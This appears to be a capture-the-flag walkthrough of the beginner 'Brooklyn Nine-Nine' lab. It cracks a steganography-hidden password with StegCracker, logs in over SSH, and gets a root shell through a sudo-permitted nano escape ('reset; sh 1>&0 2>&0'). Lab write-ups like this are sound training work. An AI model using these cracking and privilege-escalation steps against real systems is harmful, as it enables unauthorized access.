# Brooklyn Nine-Nine
Though the name of this room refers to one of the globally famous series, it does not have anything to solve the box. To be honest, this room is a really easy box once you get the initial foothold. Marked as beginner, this box is truly beginner-friendly and very easy to solve. 

This box can be solved in two ways, I'll be explaining one of them. In this path, we'll be using mainly Steghide and GTFOBins. So, let's get started!

### Initial Foothold
Once the machine gets deployed, we can go `http://<machine_ip>` and see that there is an auto-sizing Brooklyn Nine-Nine poster that adjusts its size to our browser's window size. Which looks like:

![homepage_poster](./.images/homepage_poster.png)

For any webpage, the first thing that we can do is check out it's source-code and over there we can see a hint related to `steganography`.

![source-code](./.images/source_code.png)

Now, we can think like we have an image and a hint towards steganography. So, we can download the image and see if there is something hidden inside it. We can use `Steghide` to uncover the hidden data:

```
tester@kali:~/Downloads$ steghide extract -sf brooklyn99.jpg 
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```

Steghide was not able to retrieve the data from the image, so we can try to do the same with `StegCracker`. If StegCracker is not present on your machine, it can be downloaded using the command `sudo apt install stegcracker`.

We can pass on a wordlist as to StegCracker which it uses to attack the target file and if the wordlist is not passed on then it by default uses the rockyou.txt to attack the target file.

```
tester@kali:~/Downloads$ stegcracker brooklyn99.jpg 
StegCracker 2.0.9 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20395 passwords
Your file has been written to: brooklyn99.jpg.out
admin
```

We can see that the file has been cracked and the data has been written to a new file. 

```
tester@kali:~/Downloads$ cat brooklyn99.jpg.out 
Holts Password:
*******************

Enjoy!!
```

Now, we have the user credentials that we can try to use with SSH. Keep in mind that the username is `holt` and I've hid the password with `*`.

```
tester@kali:~$ ssh holt@10.10.182.115
The authenticity of host '10.10.182.115 (10.10.182.115)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.182.115' (ECDSA) to the list of known hosts.
holt@10.10.182.115's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ cat user.txt 
*******************************
```

And we got the `user.txt` flag. Now, the next task is to get the root access for which we need to perform privilege escalation.

### Privilege Escalation
As we have already logged in as holt, we need to become root to get the second flag. We can check for the commands that can be executed as user holt. To do this we can use the command `sudo -l` to list all the commands that we can execute as root.

```
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

We can see that the command `/bin/nano` can be executed as 'root' by user 'holt'. So, we can check if there are any [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) for `nano`. We can run the commands as described in GTFOBins and get the shell access as root.

First, we need to enter the `nano editor` with sudo privilege using the command:

```
holt@brookly_nine_nine:~$ sudo /bin/nano
```

Once, we get into the editor we need to press Ctrl+R and then Ctrl+X and then we can execute the command `reset; sh 1>&0 2>&0`. This will give us a root shell using which we can read the `root.txt` from `/root` directory.

![privesc](./.images/privesc.gif)

Now we can take the flag from `root.txt` and submit it as the flag for the second question. With this, we have solved the `Brooklyn Nine-Nine` room!

## Some Key Points to Take Away
1. Whenever you have access to a webpage, check it's source-code for any kind of `Sensitive Information Disclosure`.
2. If you have an image, try to check it for steganography with Steghide or StegCracker.
3. For PrivEsc, always run the command `sudo -l` to check what commands can be executed with sudo privilege by the user and then look up how that command can be exploited using `GTFOBins`.
